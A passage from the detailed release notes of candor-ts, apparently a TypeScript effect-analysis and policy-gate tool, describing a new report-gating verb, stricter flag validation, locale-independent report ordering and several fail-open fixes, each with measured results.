judged-nothing **iff** there are no entries (row 3 — a pre-⟨0.21⟩ producer that LISTS functions keeps its
standing); `analyzed` present but unreadable fails **closed**. Entries are never touched, so the change is
strictly additive, and a package chained twice — once judged, once not — keeps its coverage.

**The same rule binds every route a report arrives by, not just the chain** (SPEC §3.1 ⟨0.24⟩: "the
obligation is on the reading, not on the route"). `gate --report`, the MCP `candor_gate` tool and the LSP's
live gate all read a report this engine did not produce and are **not** version-checked, so they are where
a foreign count-0 report actually lands: `gate --report` now prints the caveat beside "no violations" (exit
code and verdict document unchanged — byte-equality with `scan --policy` is §3.1's acceptance test, and a
scan that analyzed nothing writes `{ok: true, analyzed: {count: 0}}` and exits 0), `candor_gate` returns an
additive `judgedNothing` + `caveat`, and the LSP logs it once (an empty editor over such a report is not an
all-clear). Blast radius on real code: of 83 packages scanned out of `node_modules`, **0 emit `count: 0`**
— this engine mints a `<module>` unit per file and refuses to write a report at all when a directory has no
TypeScript sources — while **13 (15.7%)** are the legitimate all-pure kind, the same ratio argument from
the other side. Conformance PART 26's CONTROL SEPARATION for ts moves from `INDISTINGUISHABLE` to
**`SEPARATED on 64/80 cells`**, and its `empty_zero` arm from 56 ABSENT cells to **0**.

**⟨0.24⟩ `gate --report <locator> --policy <file>` — THE GATE AS A FUNCTION OF A GIVEN SIGNATURE.** SPEC
§3.1 makes it a MUST and candor-ts did not have it; PART 27's R6 row printed `NOSURF`, and the 0.24
changelog entry in candor-spec had to be publicly corrected to "pinned 2-of-4" because of it. It lands
here as a QUERY verb, inheriting §3.3.1's grammar unchanged — the same locator rules and discovery
fallback, the same `CANDOR_POLICY` fallback, the same exit-2 on an unreadable policy — with **no
positionals**, exit codes exactly `scan --policy`'s (0 / 1 / 2), and `--json` defined as `--gate-json -`
(a scan's `--json <file>` writes the *report*, and there is no report to write here, so the verb's machine
output is the verdict; a second meaning would be the one place a consumer could tell the two routes apart).

Two things it buys. *It is the supply-chain verb*: gating a dependency's published report is the operation
an adopter wants and could not previously express without re-analysing code they do not have. And *it
makes the code-implements-spec direction testable at all*: every other route into the gate recomputes `S`
from source, so a defect in the **gate** and a defect in the **classifier** were indistinguishable from
any test that could be written — which is exactly how this rung's own §6.2 divergence hid.

**THE MUST NOT.** No re-deriving, widening or re-classifying: `S` and `D` come from the report as given,
and an ABSENT entry is absent — the ⟨0.21⟩ purity claim — never back-filled. A new reader
(`query-core.mjs` `loadGateReport`) reads the report file(s) at the locator and nothing else: no
`.callgraph.json`, no `CANDOR_DEPS` / `.candor/config` `deps` chaining, no `.hierarchy.json`, no
`net-partner` re-mapping. It is a SEPARATE reader because `loadReport` returns only the `functions` array
and discards the envelope, while three fields of the verdict (`analyzed.count`, `unanalyzed`, the ⟨0.15⟩
coverage advisory) are envelope facts — read in the SAME pass as the entries, so the two cannot come from
two reads of a file another process may rewrite between them. Proven with an absent entry beside **three
baits at once** — a callgraph sidecar naming it and edging it to an effectful unit, a chained dep report
giving it the effect outright, and a `.candor/config` `deps` key — verdict clean, with a NEGATIVE CONTROL
(the same baits, the effect written INTO the report) that exits 1, and **mutation-verified**: with the
reader patched to adopt the sidecar-named entry, the absent arm goes 0 → 1.

**⚠ `netClass` IS NOW READ VERBATIM ON EVERY REPORT ROUTE**, which changes MCP `candor_gate` and the LSP
diagnostics as well as the new verb. `netClass` records the PRODUCER's `net-partner` judgment and its
masked-surface flag, neither of which rides the wire — so re-deriving the ⟨0.20⟩ destination class from
`hosts` in a consumer answered with THIS machine's evidence about someone else's project, in both
directions at once: a host the producer classified `known-partner` re-read as `unknown-host` (a
**fabricated** `deny Net[unknown-host]` hit) and a masked surface re-read from its one benign visible
literal, losing `unknown-host` (the fail-open mirror, on the filter a hardening team narrows through). An
entry that carries no `netClass` still falls back to the derivation, which is floored at `unknown-host` —
the direction that cannot un-narrow the filter.

**ANSWERABILITY: a rule whose evidence the wire does not carry is REFUSED (exit 2), never evaluated** —
all three measured fail-OPEN if approximated instead. `forbid A -> B` (whole-policy: a report's `calls` is
effect-relevant, so a crossing into a wholly PURE unit is invisible while `forbid` matches on NAME);
`allow <E> …` (whole-policy: the AS-EFF-008 surface-completeness marker does not ride the wire, and
`netClass: unknown-host` is NOT that marker — it also names a merely unrecognised host); and a
class-scoped `deny` whose scoping datum is an ABSENT optional field (per-(rule, function)) — the live one,
where `deny Net[unknown-host]` over a `Net`-bearing entry with no `netClass` matched an empty set and
returned **exit 0** where the bare `deny Net` returns 1.

**The refusal is MINIMAL, not coarse.** The class set only GROWS and `Reject` is upward-closed in it, so
where the classes determinable from the entry ALONE already intersect the filter, the rule FIRES — missing
data could only have added matches. Only an EMPTY determinable set (does not fire, and more evidence still
could) is refused. One consequence worth naming: because this engine CONTRIBUTES `unresolved` at the entry
that owns a reasonless direct `Unknown` (§6.2 requirement 3), it does **not** repeat the over-broad
refusal SPEC §3.1 records against candor-swift — `deny E Unknown[unresolved]` over such an entry FIRES
rather than exiting 2.

**EQUIVALENCE IS THE ACCEPTANCE TEST, AND IT IS BYTE-LEVEL.** For any report a scan produced,
`gate --report <it> --policy P` produces a `--gate-json` document byte-equal to `scan --policy P`'s —
`analyzed.count`, `reasonClass`, `netClass` and the coverage advisory included — with the same exit code.
Measured over **73 rows and three corpora** at landing (a synthetic fixture exercising every effect and
several reason classes, a 1717-function slice of eslint's rules, and an `unanalyzed`/exit-2 fixture); 22
of them ride in `npm test` as the standing gate, with a non-vacuity control (the matrix must contain
violating rows AND verdicts carrying `netClass`/`reasonClass`) and a check that **no refusal fires on a
self-produced report**. Cross-checked against `candor-spec/reference/policy_model.py` over **19 968 rows**
(1536 REACHABLE signatures × 13 verbs) — **0 disagreements**, with a mispaired-verb negative control that
fires 768.

Both routes into the gate land in the same `evaluatePolicy` (SPEC §6.2: "THE GATE AND THE DISCLOSURE MUST
APPLY THE SAME RULE, AND SHOULD SHARE THE SAME CODE"), which is what makes "the same verdict from the same
signature" a property of the code rather than of two consistent authors. Also: `--gate-json` on a
read-only query is now a loud exit 2 naming `gate`, rather than silently inert — the gateless-green shape
where a wrapper names a verdict path, nothing writes it, and the wrapper reads no violations and calls the
build clean.

**⚠ `--class` ACCEPTED A VALUE IT COULD NOT HONOUR, AND ANSWERED A NARROWER QUESTION** — SPEC §6.2 ⟨0.24⟩'s
value grammar (`query-core.mjs`, `query.mjs`). `--class dyanmic` — a typo — exited **0** with an empty
filter: `blindspots` and `unverified` both reported **zero** holes, after a one-line warning on stderr that
no CI log reads. A repeated `--class reflect --class native` silently took the FIRST list (the verbs read
`args.indexOf`), answering with less than either flag asked for. Both are exit-0 documents that look
exactly like a clean report.

`--class <c>[,<c>…]` now takes ONE comma-separated list and is NOT repeatable; every token must be one of
the six classes or the aliases `dynamic` / `*`; anything else is a **usage error, exit 2**, naming the
offending token and listing the accepted set, with **no answer document on stdout**:

```
candor-ts: --class: unknown reason class `dyanmic` (accepted: reflect,dispatch,indirect,native,unresolved,setup; aliases: dynamic,*)
candor-ts: --class is not repeatable — pass ONE comma-separated list (e.g. `--class reflect,native`); a second --class is a usage error, not a union
```

**WHY THIS IS THE OPPOSITE OF THE POLICY SIDE, WHERE AN UNKNOWN CLASS IS DROPPED WITH A WARNING.** A token
dropped from a `deny E Unknown[…]` rule leaves that rule **WIDER** — it still fires, on more — so the
mistake surfaces as a failing gate. A token dropped here leaves the filter **NARROWER**, and on
`unverified` a narrower answer is indistinguishable from a real all-clear: the verb whose entire job is to
name the holes a green `pure`/`deny E` layer passes without proving anything reports fewer of them, the
more the user narrows. That is the same fail-open the transitive-resolution fix below closed, arriving
through the argument parser instead of the match rule. A query flag that cannot be honoured is refused.

One bad token poisons the whole list — `--class reflect,dyanmic` is refused rather than partially honoured
as `{reflect}`, since a partial honour is exactly the silently-smaller answer. Validation sits in
`parseClassFilter` (which now throws `ClassFilterError` instead of warning) and is applied at the single
CLI choke point where `--class` is consumed, so it covers **every** verb that takes the flag: `blindspots
--class`, `blindspots --stats --class` and `unverified --class` — this engine's three readers of the
filter — and any future one, without a second copy of the rule.

**No verdict and no selection changes for well-formed input**, asserted by count and not just by exit
code (`test-unit.mjs` at the function boundary, `test.mjs` CLI-10 end to end): unfiltered / `dynamic` /
`*` / a comma list all select what they selected before, `native` still selects 0 at exit 0, and the
repeat test uses two VALID tokens so the only defect under test is the repetition — the message is
asserted, so it cannot pass because some other arg-parse rule happened to exit 2. `blindspots --class`'s
class-set semantics are untouched (§6.2 req 0); the value grammar is a property of the FLAG and applies
wherever the flag is accepted. Pinned four-way by conformance PART 27 row R5 (`value-grammar`), whose
`engine: "*"` waiver — the suite's only one — this closes.

**§4 ⟨0.24⟩'s FIFTH `unknownWhy` kind, `ambiguous:` — AUDITED, ALREADY CONFORMANT, now controlled**
(`test.mjs`, `test-unit.mjs`, `AGENTS.md`; **no production change, no verdict change**). §4 grew a fifth
kind — the analyser's own *name resolution* was ambiguous (two same-named local definitions), so no owner
type could be formed at all; not a `dispatch:` with a missing body, not a `callback:` (no function value).

§4 ⟨0.24⟩ warns that **an engine holds this vocabulary twice and the halves drift**: a prefix/string
classifier feeding §6.2's class table, and a typed/structural one (enum, union, validator, kind-keyed
`switch`). The reference JVM engine had exactly that split — `ambiguous` → `dispatch` on the string path
and a *null* kind → `unresolved` on the typed path, one token, two answers, one engine, silently.
**candor-ts holds it ONCE.** The audit enumerated every construction site (`scan.mjs` emits `reflect:`,
`callback:`, `dispatch:`, plus the `setup`-class `no-node_modules:`) and every read (`reasonClass` and the
`resolveReasonClasses` fixpoint in `policy.mjs`; `blindspots` / `blindspotsStats` / `parseClassFilter` /
`unverified --class` in `query-core.mjs`; the dependency join and the SETUP diagnostic in `scan.mjs`;
`verify-core.mjs` and `lsp.mjs`, both verbatim). There is no enum, no union type, no kind allowlist and no
validator anywhere — every class decision routes through the one prefix table, which has mapped
`ambiguous` → `dispatch` since the reason-scoped-Unknown rung. The failure mode §4 describes is
structurally unreachable here, so nothing was fixed; what was missing was the evidence.

Two ts-specific answers, both pinned by fixture:

- **candor-ts emits no `ambiguous:`** — TypeScript's module system gives every declaration a resolvable
  home — **but it carries them**. The dependency join copies a chained report's `unknownWhy` VERBATIM into
  the consumer's own report keyed by the calling function, and every query verb reads other engines'
  reports directly (`--report` at a candor-rust prefix, where the kind sits on 8710 of 19607
  `Unknown`-bearing entries). §4: *a consumer may need a kind it never emits.*
- **The `callers --include-unknown` frontier keys off the KIND, not the class** (`w.startsWith("dispatch:")`),
  which is what §4 ⟨0.24⟩ requires: `ambiguous:` projects to class `dispatch` but has NO OWNER, so a
  class-keyed frontier admits entries there is nothing to resolve overrides against. Pinned the way
  candor-rust pinned it — the kind-keyed frontier and the class-keyed `blindspots --class dispatch` run
  over ONE report and must DISAGREE about the `ambiguous:` entry. Measured with the frontier mutated to be
  class-keyed: it admits `m.Ambig.go` with `viaDispatchOn: "two same-named local definitions"`, in both the
  hierarchy and the no-hierarchy arm.

**THE CONTROL**, at three levels, because without it *"added a fifth kind"* and *"stopped checking the kind
set"* are the same diff: a fabricated off-vocabulary kind (`banana:whatever`) must round-trip verbatim and
classify through the CONSERVATIVE catch-all (§2 forward-compatibility) — asserted on `reasonClass`
directly, over `query-core` in-process, and end to end through `blindspots --json` / `--class` /
`callers --include-unknown` on a foreign report, plus through the dependency chain. Every assertion was
**mutation-verified**: dropping `ambiguous` from the table (2 unit + 5 behavioural rows red, frontier rows
correctly unmoved), the blanket catch-all → `dispatch` (both controls red at both levels), a class-keyed
frontier (5 rows red), and a kind allowlist on the chain relay (both relay rows red).

`AGENTS.md` was a second copy after all — not of the executable table, but of the vocabulary — and it had
drifted: it named `call:jwt.sign`, an origin string this engine has not emitted since the
`callback:param#i` form landed, and did not mention `ambiguous:` at all. Rewritten to state the closed
five-kind set, which three of them candor-ts actually produces, and that an unrecognised kind round-trips.
The doc drift gate now covers the kind vocabulary alongside the spec-generation strings.

**§6.2 ⟨0.24⟩ CONTRIBUTES — measured UNREACHABLE here, and now pinned so it stays that way** (`test.mjs`,
no behaviour change). The clause replaces a default keyed on the class set being EMPTY with a
*contribution* at the node, because emptiness is not upward-closed: acquiring a second, classifiable
reason REMOVED the default, so a caller of one reasonless dependency was rejected by
`deny E Unknown[unresolved]` while a caller of that dependency AND a reasoned one — strictly worse-known —
passed. It also says the fix belongs where the `Unknown` is CREATED, so the ill-formed state is never
constructed.

candor-ts is already there, twice over. The emitter writes `unknownWhy: ["unresolved"]` on any DIRECT
`Unknown` it could not name, and the trust-marker self-check refuses to write a report at all if an entry
still carries one (`direct carries Unknown but unknownWhy is empty`, exit 2) — the state is not merely
unwritten, it is **unwritable**. MEASURED before assuming it: the gate's empty-set default was
instrumented and run over five real arms — this engine's own sources, execa, got, and execa chained
against 13 dependency reports once TRUSTED and once STALE — for **0 fires and 0 direct-`Unknown`-without-
a-reason entries over 1872 `Unknown`-bearing functions**. The stale arm is the load-bearing one: a
distrusted producer's reasons are deliberately not copied at the join, which is the route candor-java
found to be its ONLY route to the default. Blast radius of implementing the join-side rule anyway: 0 class
sets changed, 0 verdict flips, trusted or stale. So it is not implemented; the invariant is pinned by test
instead, on the stale-dependency arm, asserting the scan SUCCEEDS (an invariant that fails closed is
satisfied only if a report comes out the other side).

**`unverified --class` FAILED OPEN, AND READ THE DIRECT-ONLY FIELD** — SPEC §6.2 ⟨0.24⟩ (`policy.mjs`,
`query-core.mjs`, `query.mjs`). Two independent faults in one predicate, both in the under-report
direction, and `unverified` is the verb whose entire job is to name the holes a green `pure`/`deny E`
layer is passing without proving anything.

1. It matched against `unknownWhy`, which §4 makes **direct-only by design** — a reason names a site in
   the function's *own* body — so a function whose `Unknown` is purely INHERITED carries no reason of its
   own and matched **no filter at all**. Measured on three real targets: **24%** of `Unknown`-bearing
   entries on this engine's own sources and **57–58%** on execa and got carry no direct reason.
2. An entry it could not classify was DROPPED rather than kept, so a hole was excluded by every filter
   *including one naming its own class*.

THE DIAGNOSTIC, now normative and now a test: `--class dynamic` is an alias for every genuine class, so it
must exclude NOTHING — a filtered count below the unfiltered one IS the defect and the gap is its size.
Measured before → after, unfiltered vs `--class dynamic`:

| target | policy | before | after |
|---|---|---|---|
| candor-ts's own sources | `pure` | 207 → 173 (−16%) | 207 → 207 |
| candor-ts's own sources | `deny Net Fs Exec Db` | 208 → 174 | 208 → 208 |
| execa | `pure` | 268 → 158 (−41%) | 268 → 268 |
| execa | `deny Net Fs Exec Db` | 289 → 166 (−43%) | 289 → 289 |
| got | `pure` | 64 → 21 (−67%) | 64 → 64 |
| got | `deny Net Fs Exec Db` | 74 → 25 (−66%) | 74 → 74 |

All six rows converge exactly. The filter still DISCRIMINATES — it is not "everything matches everything":
on execa chained against 13 stale dependency reports (333 holes) it selects 268 `indirect`, 76
`unresolved` and **0** `native`/`reflect`/`dispatch`.

THE REPAIR IS STRUCTURAL, because the root cause was two implementations of one rule. The GATE was never
party to this: it already resolved the class set transitively over the call graph. The divergence was
entirely consumer-side, in the one query that reads a **report** instead of the scan's in-memory graph,
carrying an open-coded second copy of the classification that nothing compared against the first. The
fixpoint and the match rule are now `resolveReasonClasses` / `reasonClassesMatch` in `policy.mjs`, called
by both, and `--class` resolves its `dynamic` alias from the same `DYNAMIC_CLASSES` list a
`deny E Unknown[dynamic]` rule does. The match FAILS CLOSED: an entry whose class set cannot be resolved
at all is KEPT by every filter.

**`blindspots --class` is deliberately UNCHANGED** — same flag, opposite correct behaviour (§6.2 req 0).
It is the SOURCE view (§3.1) and already excludes a unit whose `Unknown` is purely inherited, so every
entry it filters carries a direct reason by construction; resolving transitively there would pull in
exactly the units the verb exists to exclude. Measured, not assumed: `blindspots --class dynamic` already
excluded nothing on all three targets (237/190/55 sources, unchanged). A shared code path is not a shared
defect.

⚠ **REPORT BYTES DEPENDED ON THE AMBIENT LOCALE** — SPEC §2 ⟨0.24⟩ (`scan.mjs`, `query-core.mjs`). Seven
orderings used `String.prototype.localeCompare`, which with no locale argument consults the runtime's
default locale (in Node, taken from `LC_ALL`/`LANG` when ICU is available). One of them — the κ-coverage
ledger's name tiebreak — orders entries INSIDE the emitted report, so this was not a presentation detail:
every *"a default report is byte-identical"* claim in the spec, and the deterministic effects-fingerprint,
rested on an assumption the engine did not hold to.

MEASURED, not argued: one build, one unchanged tree, two scans differing only in the environment produced
reports with **different md5** — `coverage.uncovered` held `tpad, zpad` under `LC_ALL=C` and `zpad, tpad`
under `LC_ALL=et_EE.UTF-8`, because Estonian collates z between s and t. The keys are npm package names,
i.e. **lowercase ASCII** — the case usually assumed safe, and the one the UTF-16 hazard cannot reach.
`LC_ALL=da_DK.UTF-8` breaks a second ASCII pair (`aardvark` after `z`, aa = å). All seven sites now use the
single exported `byCodePoint` comparator that already backed `viaDispatchOn`; `scan.mjs` imports THAT one
rather than growing a near-copy that could drift back apart on inputs no test uses.

This is a **separate and stricter rule** than the ⟨0.24⟩ collation rule below: collation says *which* of
the well-defined orders, this says the order must not consult the environment at all. `localeCompare`
satisfied neither. Marked ⚠ because a report produced under a non-C locale can change bytes across this
release; under `LC_ALL=C` the order is unchanged (C already agreed with code point on these inputs).

The remaining bare `.sort()` calls are a **different** class and are untouched here: UTF-16 code-unit
order — deterministic and locale-independent, so §2-clean, but not code-point order for supplementary
characters.

⚠ **A DOT-FREE `dispatch:` reason was silently DROPPED from `possibleViaUnknownDispatch`** — SPEC §3.1
⟨0.24⟩ (`query-core.mjs`). §4 reserves a dot-free detail for an unresolved dispatch whose owner type could
not be formed at all (candor-rust emits `dispatch:untyped cross-package receiver`). With no owner and no
member, condition (3) — "is a confirmed reacher an override of `OWNER.M`?" — is UNANSWERABLE, and an
unanswerable condition must not be scored as a failed one. MEASURED before the fix on a report carrying one
dotted and one dot-free source: the frontier held only the dotted entry, in BOTH the hierarchy and the
no-hierarchy arm, and no diagnostic named the dropped one. A consumer reads that omission as "no function
may reach the target through an unresolved dispatch" — the claim the engine is not entitled to make. Such
an entry is now disclosed with `viaDispatchOn` set to the raw detail verbatim, recognised STRUCTURALLY (no
`.`) and short-circuited BEFORE the owner/member split is attempted. Two further shapes were measured here,
both from the split helpers falling back to the WHOLE STRING with no dot — which degrades the override test
into string equality between a reason detail and a function name: a detail equal to a reacher's whole qual
was disclosed, but only by REFLEXIVITY over a string that is not a type name (right output, wrong reason);
and a detail equal to a DOTTED reacher's simple method name was disclosed in the no-hierarchy arm and
DROPPED in the hierarchy arm — the same report answered two ways by whether a sidecar happens to exist.
The frontier over-lists by construction and asserts nothing into `transitive`, so a spurious entry costs
precision while a dropped one is a false all-clear. Controls (a source with no dispatch reason; a dotted
reason that genuinely fails condition (3)) are pinned OUT, so this is a widening and not a blanket.

**`viaDispatchOn` now collates by UNICODE CODE POINT** — SPEC §3.1 ⟨0.24⟩ (`query-core.mjs`). A function
carrying several `dispatch:` reasons gets ONE entry whose `viaDispatchOn` is the sorted, deduplicated,
comma-joined union of the passing members and the raw dot-free details, with the two kinds interleaved.
JavaScript's default `Array.sort` orders by UTF-16 CODE UNIT, which puts a supplementary character —
stored as a surrogate pair — BEFORE everything above the surrogate block, the opposite of code-point
order; that is exactly the comparator the clause forbids, so it is replaced with an explicit code-point
one. Pinned against candor-java's end-to-end CLI literals (`run,untyped cross-package receiver,write` and
the dedup case `run`), reproduced byte-for-byte here through this CLI. UTF-8 byte order names the ORDER,
not the METHOD: the comparator does no encoding, because a lone surrogate has no UTF-8 encoding and
encoding-first makes two distinct details compare EQUAL — cardinality-lossy in candor-java, whose
accumulator is a comparator-backed sorted set. Measured here: that loss does NOT transfer, since this
accumulator dedups by `Set` string identity and orders in a separate `Array.sort` that never drops equal
elements. The encoding is refused anyway, because that safety belongs to the accumulator rather than the
comparator and would evaporate on refactor; the lone-surrogate test is kept as a cardinality regression
guard on that shape, and says so rather than claiming a discrimination it does not have.

**A hierarchy-sidecar key this reader cannot interpret is DROPPED, not coerced** (`query-core.mjs`).
`loadHierarchy`'s `norm` turned a non-array value into `[]` and KEPT the key, putting a phantom type — a
name no code declares — into the hierarchy. That is not inert: `callersFrontier` gates on
`Object.keys(hierarchy).length > 0`, so a single metadata key takes the frontier off its documented
over-listing simple-name fallback and onto the precise subtype test, over a hierarchy that can answer
nothing. Measured on candor-java's first `"@superclass"` encoding (an object among arrays, since
flattened producer-side in candor-java `403f24b`): a flat project whose sidecar was `{}` disclosed
`possibleViaUnknownDispatch: [app.Frontier.go]`; the same project with `{"@superclass":{}}` disclosed
`[]`. The `@` extension namespace (SPEC §2.2) and any non-array value are now both dropped — asymmetric
on purpose, because a phantom key can only NARROW this frontier while an unknown key dropped can only
widen it back to the fallback, and this is a "cannot confirm" disclosure that is allowed to over-list.
Note the array-valued spelling is java's CURRENT one, so a type check alone would not have caught it.
NOT changed, and flagged for a ruling: `hasHier` gates on EMPTINESS, rust's `callers.rs` does the same,
and candor-java's `Query.java` gated on ABSENCE and took the precise path over a present-but-empty map,
which narrows. Three engines, two answers, same input. RULED since, in ts's favour — SPEC §3.1 ⟨0.24⟩ makes
an empty sidecar and an absent one the SAME input (both mean the subtype test is unanswerable, so both
over-list); candor-java measured `{}` collapsing its frontier to `[]` entirely, taking the dotted entries
that were working. No change needed here, and the absent ≡ `{}` ≢ populated triple is now a test.

**`--workspace`'s cache ownership is one derivation, and it is recorded from the WRITE** (`scan.mjs`).
`95d0b8b`'s sweep rule — *a file candor would have OVERWRITTEN on success is the file it removes on
failure* — holds only while the writer's name and the sweeper's candidate name are the same string, and
they were two spellings: the writer took `report.package` on trust, `failedDepName` required a non-empty
STRING. A manifest saying `"name": 123` made them disagree, and the disagreement was the unrecoverable
direction: `name.replace` threw, the `catch` read a scan that **exited 0** as a failure, and the sweep
deleted `<directory-basename>.json` — a name that writer would never have produced — while stderr said
"could not scan utils" about a successful scan and the count line claimed to have chained `123` with no
file on disk. Both sides now use the same total derivation. Separately, `answered`/`ownFiles` moved BELOW
the write: they used to be recorded from the SCAN, so a `writeFileSync` that threw (a read-only cache
dir, a full disk) marked the dep answered, the sweep skipped it, and the PREVIOUS run's report stood in
for one this run never put on disk — `95d0b8b`'s own class through the write door. Inert on real input:
**0 of 28,407 real `package.json` manifests across 61 `node_modules` trees have a non-string `name`**,
so the corpus is the fabrication control and the fixtures are the evidence.

⚠ **`--workspace` now re-derives the fixpoint after sweeping a stale cached dep report** (`scan.mjs`).
`95d0b8b` correctly stopped serving a cached report this run did not write, but it swept AFTER the
fixpoint rounds — and every child in those rounds is spawned with `CANDOR_DEPS` pointing at the same
cache, so a sibling that scanned cleanly had already chained the report being deleted and its own cached
report kept that answer. The file went; the conclusion drawn from it survived one hop away, in whatever
the parent then chained. Reproduced on a two-hop workspace (`libb` imports `liba`; `liba` stops being
scannable): the consumer's `callB` was **ABSENT from `functions`** — a ⟨0.21⟩ positive purity claim about
a call into source candor could not read — where the same source with no cache said
`invisible: ['liba']`. Through the interface-CHA join the identical cause moves a GATE the other way:
`deny Fs` **exit 1 warm / exit 0 cold**, red over a body that is no longer on disk. After a sweep the
fixpoint runs once more against the clean cache and the run says so on stderr; one pass suffices, because
a report file only ever appears from a success. **Gated on something having been swept, so a clean
workspace pays nothing.** Measured on vue-core (`runtime-core` chaining `@vue/reactivity` and
`@vue/shared`, whose own coverage ledger names them at 273 and 119 calls): clean arm **byte-identical**
across the change, app report and both dep reports; with `@vue/shared` made unscannable, **0 effect
gains, 0 losses, Unknown delta 0**, and **+53 `invisible` disclosures and +18 entries recovered in the
carrier's report**, 3 of them reaching the consumer. The post-change warm run is now byte-identical to
the cache-free control, which the pre-change one was not. Same shape and reason as candor-swift
`43a0eaa`.

⚠ **A `dispatch:` reason that can name neither an owner nor a member is a `callback:`** (`scan.mjs`).
SPEC §4 reserves `dispatch:` for an unresolved dispatch with a **resolvable owner type AND member** —
`owner.member` is the vocabulary's one normative detail, what conformance PART 10 compares and what the
⟨0.7⟩ dispatch-frontier resolves against the hierarchy sidecar — and says every owner-less unresolved
invocation is `callback:`. Each emission site was substituting the literal words `type`/`member` for
whichever half it could not name, publishing a `dispatch:` no frontier could resolve and a reason CLASS the
other three engines do not give the same input (rust `callback:unresolved call`, java
`callback:…Function.apply`, swift `callback:fn` — all `indirect`). Instrumented over a 15-repo corpus:
1,234 such emissions, every one from the interface-CHA arm, in two shapes that are both function VALUES —
a named type whose content is a CALL SIGNATURE (`interface UnaryFunction { (x: T): R }` — owner, no
member) and a member of an ANONYMOUS type literal (member, no owner). The nameable half is kept in the
`callback:` detail (`callback:src.a.UnaryFunction`, `callback:run`). **Effect sets and entry counts are
identical** across 14 real targets; 695 functions move to reason class `indirect`, monotonically (0 gain
`dispatch`, 0 lose `indirect`). `deny Unknown` and `deny Unknown[indirect]` are unmoved everywhere, so
nothing goes silent — but **`deny Unknown[dispatch]` narrows**: it flips exit 1 → 0 on 4 of the 14 (conf,
got, ky, p-queue), in each of which every dispatch reason in the report was one of the malformed ones
(6/6, 56/56, 18/18, 10/10). A well-formed `dispatch:mod.Iface.member` is untouched and still fails the rule.

**A `.bind`-wrapped callback is no longer dropped when the callee's signature says nothing** (`scan.mjs`).
The `.bind` arm's position gate returned early on `!hofInvokesArg(…)`, a POSITIVE test whose value cannot
distinguish "the callee invokes this position" from "I have no evidence" — so an unresolved or loosely
typed higher-order callee meant SILENCE. Measured: a dependency's free-form `forEach(xs: any[], fn: any)`
dropped a `.bind`-wrapped local writer entirely and a scoped `deny Fs` went **exit 1 → exit 0**, with the
single-tree control unchanged in both arms. The arm now drops only on positive evidence of the opposite.
`any` cannot be that evidence — `xs.forEach(cb, thisArg?: any)` and a loose library's `fn: any` are the
same type with opposite meanings — so the callability probe went three-valued and the receiver slot is
recognised by parameter NAME. A/B over 22 real targets (~13,000 functions): zero gains, losses, Unknown
delta and entry delta, with the precondition instrumented to show the differing branch never fires there.

**The TRUST-MARKER INVARIANT is now asserted over every entry, before anything is written** (`scan.mjs`).
An entry whose `inferred` contains `Unknown` MUST carry `unresolved: true` (SPEC §2), and one naming a
DIRECT `Unknown` MUST carry a non-empty `unknownWhy` (⟨0.6⟩). Both are TIER-1 markers a consumer reads
INSTEAD of re-deriving the judgment, so a contradiction between them and the effect set is undetectable from
the outside — the consumer is told in one field that the set may be incomplete and in the next that it is
not. It is asserted rather than trusted because it has already shipped broken: `e66f29e` found a union entry
publishing `inferred: ['Unknown']` with `unresolved` ABSENT, live on all seven of rxjs's published unions.
Two independent producers derive the marker and a third would be easy to add. Fail-closed: a violation
writes NO report and exits 2, because a report whose trust markers lie is worse than no report. Verified to
CATCH (a mutated producer exits 2 and writes nothing) and measured silent on real output — 42 reports /
22 978 entries offline, plus 4 live chained consumer scans and 12 live producer scans with the union emitter
armed, zero violations.

⚠ **⟨0.19⟩ The reason class survives a dependency unit that only INHERITED its `Unknown`** (`scan.mjs`).
The half underneath `4dad22d`. ⟨0.6⟩ makes `unknownWhy` DIRECT-ONLY — required on a unit that introduces
`Unknown`, absent on one that merely inherited it — so a dependency's *exported* function publishes
`inferred: ['Unknown']` with no reason at all whenever the unresolvable call is one hop further in, and the
consumer falls back to `unresolved`. `4dad22d` fixed "the join drops the reason"; this is "the producer never
published one". Measured: `deny Unknown[reflect]` is exit 1 single-tree and **exit 0 chained**, at one hop and
at two, while the bare `deny Unknown` fires throughout — so only the class-targeted middle, which is how the
reason ratchet is actually adopted, reads green. The mirror is real too: the class DEGRADES to the catch-all,
so `deny Unknown[unresolved]` is 0 single-tree and 1 chained. (Found by the java sweep, which reached it
first.)

No format rung, no producer change, no §4 vocabulary change: the dependency's own `calls` edges already say
which of its units the `Unknown` came from, and that unit's `unknownWhy` is in the same report. Resolved at
LOAD time, **per report** (the keys are report-local `fn` quals, which collide freely between packages — the
cross-package key is the `hash`, and leaf-key joining across reports is the fabrication this vein exists to
avoid) and **at CLASS granularity**, one representative reason per class. Measured over 34 real dependency
reports / 22 328 entries: 9 206 entries carry `Unknown` with no reason and 9 122 (99.1%) have one recoverable,
but the raw strings blow up to 458 on a single core-js unit while the distinct CLASSES never exceed 3.

A/B over 4 chained real targets, both arms' engine files kept by content hash: **0 effect gains, 0 losses, 0
entry delta, 0 Unknown delta**; 57 functions gain a reason string, 17 lose one, and **every class lost is
`unresolved`** — the catch-all replaced by a real class (17 gains of `indirect`, 4 of `dispatch`). No function
lost its reason field. ⚠ a `deny E Unknown[<class>]` rule may newly fire on a chained consumer, and a rule
written against `unresolved` may stop firing where a real class is now known — both directions match the
single-tree control.

⚠ **⟨0.21⟩ A chained report that DECLARES ITSELF INCOMPLETE no longer grants coverage** (`scan.mjs`). SPEC
§2 rule 3 turns a report's silence into a purity claim; a report carrying a non-empty `unanalyzed` has just
said it never read some of its own source, so its silence about that source answers nothing. Measured
before the fix: a dependency with one unparseable file scans to exit 0 with a report that still names its
package, and a consumer calling a declaration that file was supposed to hold went from
`invisible: ["deplib"]` unchained — the honest hedge — to **absent from the report entirely**, a ⟨0.21⟩
positive purity claim about a function that writes to the filesystem, with `deny Fs` at exit 0. The
single-tree control over the same sources is exit 2 ("a gate cannot be green over unanalyzed code"), so
chaining an incomplete report was strictly WORSE than not chaining it: the dependency's own scan refused to
certify a gate over itself and the consumer certified one on its behalf. The same door `651c9f9` closed for
a report failing the §2.1 version check, with a different key.

The TREATMENT differs from staleness, and that difference is the point: a stale report's entries are
assertions from a build we do not trust and are downgraded to `Unknown`; an incomplete report's entries were
derived from source it DID read and are kept **unchanged**. Only the SILENCE hedges — strictly additive, no
effect is ever removed. Half 1's unanswerable-key `Unknown` still fires alongside the ledger hedge rather
than being replaced by it (letting the hedge replace it would have narrowed `deny E Unknown[dispatch]` — a
gate lost to a fix), and an `import` backed only by an incomplete report discloses
`Unknown[incomplete-dep:<pkg>]`, the initializer-edge half of the same argument. ⚠ a chained consumer may
